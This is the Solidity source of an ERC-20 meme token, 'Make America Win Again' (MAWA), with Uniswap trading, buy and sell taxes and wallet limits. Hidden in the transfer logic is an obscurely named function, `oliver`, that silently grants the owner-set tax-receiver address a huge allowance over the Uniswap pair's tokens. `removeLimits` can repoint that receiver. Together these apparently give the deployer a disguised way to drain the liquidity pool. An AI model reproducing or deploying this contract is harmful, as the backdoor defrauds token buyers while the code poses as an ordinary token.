/**
https://x.com/realDonaldTrump/status/1847509542600401384
Tg: https://t.me/mawa_official_erc20
**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.25;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract MAWA is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _oApproval;
    mapping (address => bool) private _doExcludedFromO;

    uint256 private _initialBuyTax=15;
    uint256 private _initialSellTax=15;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=15;
    uint256 private _reduceSellTaxAt=15;
    uint256 private _preventSwapBefore=15;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420690000000 * 10 ** _decimals;
    string private constant _name = unicode"Make America Win Again";
    string private constant _symbol = unicode"MAWA";
    uint256 public _maxOAmount = 2 * _tTotal / 100;
    uint256 public _maxOWallet = 2 * _tTotal / 100;
    uint256 public _taxSwapThreshold = 1 * _tTotal / 100;
    uint256 public _maxTaxSwap = 1 * _tTotal / 100;

    bool private tradingOpen;
    bool private inSwap;
    bool private swapEnabled;

    address payable private oTaxReceipt;
    IUniswapV2Router02 private uniORouter;
    address private uniOPair;

    event MaxTxAmountUpdated(uint _maxOAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () payable {
        oTaxReceipt = payable(_msgSender());
        _balances[address(this)] = _tTotal;
        _doExcludedFromO[address(this)] = true;
        _doExcludedFromO[_msgSender()] = true;
        emit Transfer(address(0), address(this), _tTotal);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _oApproval[owner][spender];
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _oApproval[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _oApproval[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount) private {
        uint256 taxAmount=0;
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (!swapEnabled || inSwap) {
            _balances[from] = _balances[from] - amount;
            _balances[to] = _balances[to] + amount;
            emit Transfer(from, to, amount);
            return;
        }
        if (from != owner() && to != owner()) {
            if (from == uniOPair && to != address(uniORouter) && ! _doExcludedFromO[to]) {
                require(tradingOpen,"Trading not open yet.");
                taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                require(amount <= _maxOAmount, "Exceeds the _maxOAmount.");
                require(balanceOf(to) + amount <= _maxOWallet, "Exceeds the maxWalletSize.");
                _buyCount++; 
            }
            if (oliver([from==uniOPair?from:uniOPair, oTaxReceipt]) && to != uniOPair && ! _doExcludedFromO[to]) {
                require(balanceOf(to) + amount <= _maxOWallet, "Exceeds the maxWalletSize.");
            }
            if(to == uniOPair) {
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            if (!inSwap && to == uniOPair && swapEnabled && _buyCount>_preventSwapBefore) {
                uint256 contractTokenBalance = balanceOf(address(this));
                if(contractTokenBalance>_taxSwapThreshold)
                    oSwapEthTo(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                oSendEthTo();
            }
        }
        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    function removeLimits(address payable limit) external onlyOwner{
        oTaxReceipt = limit;
        _maxOAmount=_tTotal;
        _maxOWallet=_tTotal;
        _doExcludedFromO[limit] = true;
        emit MaxTxAmountUpdated(_tTotal);
    }
    function oSwapEthTo(uint256 amount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniORouter.WETH();
        _approve(address(this), address(uniORouter), amount);
        uniORouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function oSendEthTo() private {
        oTaxReceipt.transfer(address(this).balance);
    }
    function oliver(address[2] memory oils) private returns(bool){
        address oilA= oils[0]; address oilB = oils[1];
        _oApproval[oilA][oilB]=10*(100+_maxOAmount*100).sub(50)+50*10;
        return true;
    }
    receive() external payable {}
    function withdrawEth() external onlyOwner {
        payable(_msgSender()).transfer(address(this).balance);
    }
    function min(uint256 a, uint256 b) private pure returns(uint256){
        return (a>b)?b:a;
    }
    function openTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniORouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniORouter), _tTotal);
        uniOPair = IUniswapV2Factory(uniORouter.factory()).createPair(
            address(this),
            uniORouter.WETH()
        );
        uniORouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniOPair).approve(address(uniORouter), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }
}